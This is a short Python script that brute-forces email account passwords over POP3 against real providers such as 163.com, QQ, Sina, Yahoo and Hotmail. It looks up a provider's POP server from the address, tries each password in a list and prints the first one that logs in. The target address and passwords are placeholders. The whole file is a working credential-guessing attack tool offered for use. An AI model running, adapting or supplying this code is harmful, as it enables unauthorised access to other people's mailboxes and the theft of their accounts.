import poplib, string
def brute_tencent(serverName,user, pwd):
    PopServer = poplib.POP3(serverName)
    #print PopServer.getwelcome()
    PopServer.user(user)
    try:
        PopServer.pass_(pwd)
    except Exception as msg:
        print ""
    else:
        print("%s  %s" % (user, pwd))
        exit()

def get_emailType(email):
    email = email.split(".")
    email = email[0].split("@")
    serverName ={
        'sina':'pop3.sina.com.cn',
        'sohu':'pop3.sohu.com',
        '126':'pop.126.com',
        '139':'POP.139.com',
        '163':'pop.163.com',
        'qq':'pop.qq.com',
        'exmail':'pop.exmail.qq.com',
        'yahoo':'pop.mail.yahoo.com',
        'hotmail':'pop3.live.com',
    }
    return serverName[email[1]]


mail = "xxx@163.com"
pwds = ['xx','xx','xx']
#ejfjucqqjucvbegd
serverName = get_emailType(mail)
for pwd in pwds:
    brute_tencent(serverName,mail, pwd)